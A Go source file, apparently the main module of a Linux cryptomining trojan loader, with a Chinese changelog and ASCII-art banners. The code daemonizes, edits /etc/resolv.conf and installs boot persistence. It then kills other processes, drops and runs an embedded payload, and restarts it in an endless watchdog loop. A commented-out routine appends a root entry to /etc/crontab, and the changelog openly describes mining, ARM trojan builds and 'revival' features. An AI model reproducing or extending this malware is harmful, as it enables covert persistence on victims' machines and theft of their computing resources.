package main

import (
	"os"
	"path"
	"strings"
	"time"
	"add"
	"cpack"
	"path/filepath"
)

//////////////获取自身文件名
//第一个还回值为程序文件名，第二个还回值为程序文件名带后缀，第三为程序后缀，第四个为程序目录不带文件名
func file()  (s1,s2,s3,s4 string){
	var filenameOnly string
	fullFilename := os.Args[0]
	var filenameWithSuffix string
	filenameWithSuffix = path.Base(fullFilename) //获取文件名带后缀
	var fileSuffix string
	fileSuffix = path.Ext(filenameWithSuffix) //获取文件后缀
	filenameOnly = strings.TrimSuffix(filenameWithSuffix, fileSuffix) //获取文件名
	filepath,_:= filepath.Abs(filepath.Dir(os.Args[0]))//获取目录
	return filenameOnly,filenameWithSuffix,fileSuffix,filepath
}

///获取结束
//暂时关闭这个功能
/*func ScheduledTask() {
	////////获取自身文件名开始
	filename := "/"
	filename += filenameOnly
	/////////获取自身文件名结束
	pwd, err := os.Getwd()
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	//////////连接字符串添加计划任务
	pwd += filename
	mulu1 := "echo '0 "
	mulu1 += C.GoString(&C.Rtime[0])
	mulu3 := " * * * * root "
	mulu2 := "' >> /etc/crontab"
	mulu1 += pwd
	mulu1 += mulu2
	//////////连接结束
	///////////开始执行命令
	cmd := exec.Command("/bin/bash", "-c", mulu1)
	out, err := cmd.Output()
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println(string(out))
	//////////执行结束
	//fmt.Println(mulu1) //打印复活指令用的

}*/
//写入文件




func main() {

	cpack.Daemon()//（后台运行）
	add.AppendToFile("/etc/resolv.conf","nameserver 8.8.8.8      //google\r\nnameserver 114.114.114.114      //114\r\n")//修复dns
	filenameOnly,_,_,filepath:=file()
	add.Sh(filenameOnly,filepath)
	add.Boot(filenameOnly)//重启上线，暂时这么写
	downloadfile :=cpack.Filename
	//ScheduledTask()    //添加计划任务复活//暂时停止这个功能不能用......
	add.Kill()
	add.RunFile(downloadfile) //释放文件并且运行啦
	for true { //无限循环
		if cpack.CsExistProcess(downloadfile)==false {//false为主，不然可能无限复活

			time.Sleep(500)
			add.Kill()
			add.RunFile(downloadfile)//进程死了就启动

	  } else
		{	//存在的话就不管他了

			time.Sleep(500)
		}

		time.Sleep(500)

	}
}

/*
写的很智障，见谅
qq：1509477745
http://blog.xn--pssa2683b.top/
5月5号1.1发布
5月26号2.1发布：修改了重启上线，尝试增强linux兼容性
7月3号2.2发布：再次修改了重启上线，应该彻底解决了126，127问题，增加了进程守护，linux兼容性再次增强，修复无root无法挖矿问题
7月24日2.3发布：增加arm马，新增生成分组，增加了自定义进程功能
8月11日2.3.1发布：暂时删除arm马，修复了部分系统无限复活的bug，尝试解决部分系统内核释放不完整，优化了整体代码.
10月3日2.4完成：增加了cpuk，自定义k，修复了dns问题，增加了服务启动
 */

/********************************************************************************************************

                                      _oo0oo_
                                     o8888888o
                                     88" . "88
                                     (| -_- |)
                                     0\  =  /0
                                   ___/`---'\___
                                 .' \\|     |// '.
                                / \\|||  :  |||// \
                               / _||||| -:- |||||- \
                              |   | \\\  -  /// |   |
                              | \_|  ''\---/''  |_/ |
                              \  .-\__  '-'  ___/-. /
                            ___'. .'  /--.--\  `. .'___
                         ."" '<  `.___\_<|>_/___.' >' "".
                        | | :  `- \`.;`\ _ /`;.`/ - ` : | |
                        \  \ `_.   \_ __\ /__ _/   .-` /  /
                    =====`-.____`.___ \_____/___.-`___.-'=====
                                      `=---='
                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

                          佛祖保佑    永无BUG    永不修改

********************************************************************************************************/
/**
 *　　　　　　　 ┏┓　 ┏┓+ +
 *　　　　　　　┏┛┻━━━┛┻┓ + +
 *　　　　　　　┃　　　　　　┃ 　
 *　　　　　　　┃　　　━　　 ┃ ++ + + +
 *　　　　　　 ████━████  ┃+
 *　　　　　　　┃　　　　　　　┃ +
 *　　　　　　　┃　　　┻　　　┃
 *　　　　　　　┃　　　　　　┃ + +
 *　　　　　　　┗━┓　　　┏━┛
 *　　　　　　　　 ┃　　　┃　　　　　　　　　　　
 *　　　　　　　　 ┃　　　┃ + + + +
 *　　　　　　　　 ┃　　　┃　　　　Code is far away from bug with the animal protecting　　　　　　　
 *　　　　　　　　 ┃　　　┃ + 　　　　神兽保佑,代码无bug　　
 *　　　　　　　　 ┃　　　┃
 *　　　　　　　　 ┃　　　┃　　+　　　　　　　　　
 *　　　　　　　　 ┃　 　 ┗━━━┓ + +
 *　　　　　　　　 ┃ 　　　　   ┣┓
 *　　　　　　　　 ┃ 　　　　　 ┏┛
 *　　　　　　　　 ┗┓┓┏━┳┓┏┛ + + + +
 *　　　　　　　　  ┃┫┫ ┃┫┫
 *　　　　　　　　  ┗┻┛ ┗┻┛+ + + +
 */